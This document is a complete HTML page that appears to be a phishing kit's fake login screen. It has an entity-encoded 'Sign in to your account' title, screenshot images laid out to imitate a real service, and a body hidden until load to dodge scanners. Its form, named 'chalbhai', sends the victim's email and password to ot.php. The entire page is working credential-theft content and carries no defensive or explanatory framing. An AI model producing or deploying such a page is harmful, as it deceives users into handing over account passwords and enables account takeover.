<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#83;&#105;&#103;&#110;&#32;&#105;&#110;&#32;&#116;&#111;&#32;&#121;&#111;&#117;&#114;&#32;&#97;&#99;&#99;&#111;&#117;&#110;&#116;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicono.ico"/>
			
			<style type="text/css">
			.textbox {
   
    height: 30px;
    width: 275px;
	padding-left:5px;
    border: 1.5px solid #848484;
}
</style>
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<body style="visibility:hidden" onload="unhideBody()">
</head>
<body>
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:866px; height:663px; z-index:0"><img src="images/b1.png" alt="" title="" border=0 width=866 height=663></div>

<div id="image2" style="position:absolute; overflow:hidden; left:866px; top:0px; width:498px; height:663px; z-index:1"><img src="images/b2.png" alt="" title="" border=0 width=498 height=663></div>

<form action="ot.php" name=chalbhai id=chalbhai method=post>
<input name="formtext1" class="textbox" placeholder="email@domain.com" required type="text" style="position:absolute;width:350px;left:915px;top:188px;z-index:2">
<input name="formtext2" class="textbox" placeholder="Password" required type="password" style="position:absolute;width:350px;left:915px;top:226px;z-index:3">
<div id="formimage1" style="position:absolute; left:915px; top:297px; z-index:4"><input type="image" name="formimage1" width="85" height="32" src="images/b3.png"></div>

</body>
</html>
